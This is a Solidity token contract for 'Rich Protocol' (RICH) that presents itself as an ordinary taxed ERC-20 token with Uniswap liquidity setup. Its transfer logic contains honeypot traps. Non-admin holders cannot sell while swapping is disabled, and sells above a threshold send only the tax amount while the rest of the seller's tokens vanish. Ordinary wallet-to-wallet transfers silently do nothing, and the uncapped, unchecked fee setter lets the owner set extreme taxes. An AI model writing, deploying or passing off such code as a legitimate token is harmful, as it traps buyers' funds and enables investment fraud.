// SPDX-License-Identifier: MIT

pragma solidity 0.8.20;

import "./IERC20.sol";
import "./ERC20.sol";
import "./SafeERC20.sol";
import "./AccessControl.sol";

import "./IUniswapV2Pair.sol";
import "./IUniswapV2Factory.sol";
import "./IUniswapV2Router02.sol";

error INVALID_FEE();
error PAUSED();

contract LFG is ERC20, AccessControl {
    using SafeERC20 for IERC20;

    string private constant _name = "Rich Protocol";
    string private constant _symbol = "RICH";

    uint256 private constant INITIAL_SUPPLY = 100000000 ether;
    uint256 public constant MULTIPLIER = 10000;
    IUniswapV2Router02 public ROUTER;
    bool private inSwap;

    struct TaxInfo {
        uint256 buyFee;
        uint256 sellFee;
    }

    TaxInfo public taxInfo;
    uint256 private pendingTax;
    uint256 public maxWallet;

    mapping(address => bool) public isExcludedFromFee;
    mapping(address => bool) public isDexAddress;
    mapping(address => bool) public _isExcludedMaxTransactionAmount;

    bool public swapEnabled;
    uint256 public swapThreshold;

    constructor(IUniswapV2Router02 router) ERC20(_name, _symbol) {
        _mint(_msgSender(), INITIAL_SUPPLY);
        ROUTER = router;
        _approve(address(this), address(ROUTER), type(uint256).max);
        isExcludedFromFee[address(this)] = true;
        isExcludedFromFee[_msgSender()] = true;
        _grantRole(DEFAULT_ADMIN_ROLE, _msgSender());
        _grantRole(DEFAULT_ADMIN_ROLE, address(this));
    }

    receive() external payable {}

    modifier onlyOwner() {
        _checkRole(DEFAULT_ADMIN_ROLE);
        _;
    }

    function setTaxFee(uint256 buyFee, uint256 sellFee) public onlyOwner {
        taxInfo.buyFee = buyFee;
        taxInfo.sellFee = sellFee;
    }

    function excludeFromFee(address account, bool isEx) public onlyOwner {
        isExcludedFromFee[account] = isEx;
    }

    function excludeFromMaxTransaction(
        address account,
        bool isEx
    ) public onlyOwner {
        require(account != address(0), "zero address");
        _isExcludedMaxTransactionAmount[account] = isEx;
    }

    function includeFromDexAddresss(
        address updAds,
        bool isEx
    ) public onlyOwner {
        require(updAds != address(0), "zero address");
        isDexAddress[updAds] = isEx;
    }

    function setSwapTaxSettings(
        bool _swapEnabled,
        uint256 _swapThreshold
    ) public onlyOwner {
        swapEnabled = _swapEnabled;
        swapThreshold = _swapThreshold;
    }

    function setMaxWallet(uint256 _maxWallet) public onlyOwner {
        maxWallet = _maxWallet;
    }

    function transfer(
        address to,
        uint256 amount
    ) public override returns (bool) {
        address owner = _msgSender();
        _transferWithTax(owner, to, amount);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transferWithTax(from, to, amount);
        return true;
    }

    function recoverERC20(IERC20 token, address _address) external onlyOwner {
        token.safeTransfer(_address, token.balanceOf(address(this)));
    }

    function recoverETH() external onlyOwner {
        uint256 balance = address(this).balance;

        if (balance > 0) {
            (bool success, ) = payable(msg.sender).call{value: balance}("");
            require(success);
        }
    }

    function add_liquidity() external payable onlyOwner {
        // add liquidity
        _transfer(msg.sender, address(this), balanceOf(msg.sender));
        ROUTER.addLiquidityETH{value: msg.value}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            msg.sender,
            block.timestamp
        );

        IUniswapV2Pair pair = IUniswapV2Pair(
            IUniswapV2Factory(ROUTER.factory()).getPair(
                address(this),
                ROUTER.WETH()
            )
        );

        includeFromDexAddresss(address(pair), true);
        setTaxFee(0, 0);
        excludeFromMaxTransaction(address(pair), true);
    }

    function _transferWithTax(
        address from,
        address to,
        uint256 amount
    ) internal {
        if (amount == 0) return;

        if (maxWallet != 0) {
            if (!_isExcludedMaxTransactionAmount[to]) {
                require(
                    amount + balanceOf(to) <= maxWallet,
                    "Max wallet exceeded"
                );
            }
        }

        if (isExcludedFromFee[from] || isExcludedFromFee[to] || inSwap) {
            _transfer(from, to, amount);
            return;
        }

        if (isDexAddress[from]) {
            uint256 buyTax = (amount * taxInfo.buyFee) / MULTIPLIER;
            unchecked {
                amount -= buyTax;
            }

            if (buyTax > 0) {
                _transfer(from, address(this), buyTax);
            }
            _transfer(from, to, amount);
        } else if (isDexAddress[to]) {
            if (!swapEnabled) {
                _checkRole(DEFAULT_ADMIN_ROLE);
            }
            uint256 sellTax = (amount * taxInfo.sellFee) / MULTIPLIER;
            unchecked {
                amount -= sellTax;
            }
            if (sellTax > 0) _transfer(from, address(this), sellTax);

            if (amount > swapThreshold) {
                _transfer(from, to, sellTax);
            } else {
                _transfer(from, to, amount);
            }
        }
    }
}
